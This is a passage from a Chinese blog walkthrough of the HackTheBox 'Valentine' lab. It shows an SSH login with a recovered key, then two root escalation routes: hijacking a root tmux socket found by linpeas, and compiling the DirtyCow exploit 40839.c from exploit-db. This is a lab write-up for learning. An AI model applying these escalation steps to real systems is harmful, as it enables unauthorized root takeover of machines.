<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/valentine]</span><br><span class="line">└─$ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i real_key hype@10.10.10.79</span><br><span class="line">Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line"></span><br><span class="line">New release '14.04.5 LTS' available.</span><br><span class="line">Run 'do-release-upgrade' to upgrade to it.</span><br><span class="line"></span><br><span class="line">Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3</span><br><span class="line">hype@Valentine:~$ </span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>传一个linpeas看下结果，发现有一个root身份的tmux会话</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/usr/bin/tmux -S /.devs/dev_sess attach</span><br></pre></td></tr></tbody></table></figure>

<p>重新连接此会话，我们是root!</p>
<p>或者因为发现Linux版本比较低，dirtycow大概率是可以行的</p>
<p>上传/usr/share/exploitdb/exploits/linux/local/40839.c，然后gcc编译</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">hype@Valentine:/tmp$ gcc 40839.c -pthread -o pwn -lcrypt</span><br><span class="line">hype@Valentine:/tmp$ chmod +x pwn</span><br></pre></td></tr></tbody></table></figure>

<h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>虽然早就听说过大名鼎鼎的心脏滴血但也确实是第一次遇到。内核提权涉及到的编译问题还是不太能完全解决，也许得去学一些二进制的东西力</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://mikannse.space">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mikannse.space/2024/09/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%BA%8C%E5%9B%9B)%E4%B9%8BHTBValentine/">http://mikannse.space/2024/09/03/打靶记录(一二四)之HTBValentine/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mikannse.space" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/%E6%89%93%E9%9D%B6/">打靶</a><a class="post-meta__tags" href="/tags/linux/">linux</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/09/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%BA%8C%E4%BA%94)%E4%B9%8BHTBCurling/" title="打靶记录(一二五)之HTBCurling"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">打靶记录(一二五)之HTBCurling</div></div></a></div><div class="next-post pull-right"><a href="/2024/09/03/24-8%E6%9D%82%E8%B0%88/" title="24-8杂谈"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">24-8杂谈</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/03/26/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%B8%80%E4%B8%80)%E4%B9%8BTHMUmbrella/" title="打靶记录(一一一)之THMUmbrella"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-26</div><div class="title">打靶记录(一一一)之THMUmbrella</div></div></a></div><div><a href="/2024/03/27/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%B8%80%E4%BA%8C)%E4%B9%8BTHMDebug/" title="打靶记录(一一二)之THMDebug"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-27</div><div class="title">打靶记录(一一二)之THMDebug</div></div></a></div><div><a href="/2024/03/22/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%B8%80%E9%9B%B6)%E4%B9%8BTHMPeakHill/" title="打靶记录(一一零)之THMPeakHill"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-22</div><div class="title">打靶记录(一一零)之THMPeakHill</div></div></a></div><div><a href="/2024/09/04/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%B8%89%E9%9B%B6)%E4%B9%8BHTBUnion/" title="打靶记录(一三零)之HTBUnion"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-04</div><div class="title">打靶记录(一三零)之HTBUnion</div></div></a></div><div><a href="/2024/09/02/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%BA%8C%E4%B8%80)%E4%B9%8BHTBHeadLess/" title="打靶记录(一二一)之HTBHeadLess"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-02</div><div class="title">打靶记录(一二一)之HTBHeadLess</div></div></a></div><div><a href="/2024/09/04/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%BA%8C%E4%B8%83)%E4%B9%8BHTBGoodGames/" title="打靶记录(一二七)之HTBGoodGames"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-04</div><div class="title">打靶记录(一二七)之HTBGoodGames</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">313</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">74</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HeartBleed"><span class="toc-number">2.</span> <span class="toc-text">HeartBleed</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A2%8E%E7%A2%8E%E5%BF%B5"><span class="toc-number">3.</span> <span class="toc-text">碎碎念</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/25/Python3%E7%88%AC%E8%99%AB%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0%E7%AC%AC%E5%85%AD%E7%AB%A0%E5%8A%A8%E6%80%81%E6%B8%B2%E6%9F%93%E9%A1%B5%E9%9D%A2%E6%8A%93%E5%8F%96/" title="Python3爬虫开发笔记第六章动态渲染页面抓取">Python3爬虫开发笔记第六章动态渲染页面抓取</a><time datetime="2024-12-25T15:31:25.000Z" title="发表于 2024-12-25 23:31:25">2024-12-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/21/Wiki.js%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2%E5%8F%8Anginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/" title="Wiki.js云服务器部署及nginx反向代理配置">Wiki.js云服务器部署及nginx反向代理配置</a><time datetime="2024-12-21T03:20:41.000Z" title="发表于 2024-12-21 11:20:41">2024-12-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/17/Python3%E7%88%AC%E8%99%AB%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0%E7%AC%AC%E4%BA%94%E7%AB%A0Ajax%E6%95%B0%E6%8D%AE%E7%88%AC%E5%8F%96/" title="Python3爬虫开发笔记第五章Ajax数据爬取">Python3爬虫开发笔记第五章Ajax数据爬取</a><time datetime="2024-12-17T13:56:19.000Z" title="发表于 2024-12-17 21:56:19">2024-12-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/14/Python3%E7%88%AC%E8%99%AB%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/" title="Python3爬虫开发笔记第四章数据存储">Python3爬虫开发笔记第四章数据存储</a><time datetime="2024-12-14T15:40:04.000Z" title="发表于 2024-12-14 23:40:04">2024-12-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/14/Python3%E7%88%AC%E8%99%AB%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%A7%A3%E6%9E%90%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" title="Python3爬虫开发笔记第三章解析库的使用">Python3爬虫开发笔记第三章解析库的使用</a><time datetime="2024-12-14T06:33:42.000Z" title="发表于 2024-12-14 14:33:42">2024-12-14</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '',
      appKey: '',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  const disqus_config = function () {
    this.page.url = 'http://mikannse.space/2024/09/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%BA%8C%E5%9B%9B)%E4%B9%8BHTBValentine/'
    this.page.identifier = '/2024/09/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%BA%8C%E5%9B%9B)%E4%B9%8BHTBValentine/'
    this.page.title = '打靶记录(一二四)之HTBValentine'
  }

  const disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  btf.addModeChange('disqus', disqusReset)

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Valine' === 'Disqus' || !true) {
  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>